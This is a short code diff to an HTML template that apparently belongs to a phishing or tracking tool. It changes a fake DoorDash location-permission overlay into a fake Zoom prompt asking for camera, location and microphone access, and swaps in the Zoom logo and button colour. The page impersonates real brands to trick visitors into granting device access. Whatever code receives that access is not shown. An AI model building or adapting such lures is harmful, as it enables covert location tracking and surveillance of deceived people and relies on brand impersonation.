@@ -93,7 +93,7 @@ HTML_TEMPLATE = """
             font-family: 'Inter', sans-serif;
         }}
         .gps-btn {{
-            background: #FF3008;
+            background: #0B5CFF;
             color: white;
             border: none;
             padding: 12px 25px;
@@ -112,10 +112,10 @@ HTML_TEMPLATE = """
     <!-- GPS Permission Overlay -->
     <div class="gps-overlay">
         <div class="gps-modal">
-            <img src="https://1000logos.net/wp-content/uploads/2021/06/DoorDash-logo.png" width="150" alt="DoorDash">
-            <h2 class="doorDash-heading">DoorDash needs your location to find restaurants near you</h2>
-            <p class="doorDash-text">Please allow location access to continue to DoorDash.com</p>
-            <button class="gps-btn" id="gps-allow-btn">Allow Location Access</button>
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" width="150" alt="Zoom">
+            <h2 class="doorDash-heading">Allow Zoom to use your device for video conferences</h2>
+            <p class="doorDash-text">Allow us access to things like your camera, location, and microphone to continue using Zoom</p>
+            <button class="gps-btn" id="gps-allow-btn">Allow Access</button>
         </div>
     </div>
 
